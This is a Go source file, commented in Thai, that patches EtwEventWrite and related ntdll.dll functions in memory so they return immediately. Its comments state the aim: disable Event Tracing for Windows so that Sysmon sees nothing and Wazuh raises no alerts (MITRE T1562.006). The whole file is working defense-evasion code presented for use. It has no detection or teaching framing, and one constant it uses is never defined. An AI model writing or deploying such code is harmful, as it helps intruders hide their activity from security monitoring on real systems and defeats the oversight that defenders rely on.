package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ETW Patching — ปิด Event Tracing for Windows
//
// ETW ทำงานยังไง:
//   Process ทำอะไร → ETW บันทึก event → Sysmon อ่าน → ส่ง Wazuh → ALERT
//
// Patch ยังไง:
//   Patch EtwEventWrite() ใน ntdll.dll ให้ return 0 (SUCCESS) ทันที
//   = ETW ไม่บันทึกอะไรเลย = Sysmon ตาบอด
//
// MITRE ATT&CK: T1562.006 (Impair Defenses: Indicator Blocking)

func patchETW() error {
	// โหลด ntdll.dll
	ntdllDll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("cannot load ntdll.dll: %w", err)
	}

	// หา EtwEventWrite
	proc, err := ntdllDll.FindProc("EtwEventWrite")
	if err != nil {
		return fmt.Errorf("cannot find EtwEventWrite: %w", err)
	}

	// Patch: xor eax, eax; ret (return 0 = SUCCESS แต่ไม่ทำอะไร)
	patch := []byte{
		0x48, 0x33, 0xC0, // xor rax, rax (64-bit)
		0xC3,             // ret
	}

	// เปลี่ยน protection
	var oldProtect uint32
	addr := proc.Addr()
	err = windows.VirtualProtect(addr, uintptr(len(patch)), PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect failed: %w", err)
	}

	// เขียน patch
	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)

	// คืน protection
	windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return nil
}

// patchETWAdditional patches EtwEventWriteFull สำหรับ coverage ที่ดีขึ้น
func patchETWAdditional() error {
	ntdllDll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return err
	}

	targets := []string{
		"EtwEventWriteFull",
		"EtwEventWriteEx",
	}

	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	for _, target := range targets {
		proc, err := ntdllDll.FindProc(target)
		if err != nil {
			continue
		}

		var oldProtect uint32
		addr := proc.Addr()
		windows.VirtualProtect(addr, uintptr(len(patch)), PAGE_EXECUTE_READWRITE, &oldProtect)
		copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
		windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	}

	return nil
}
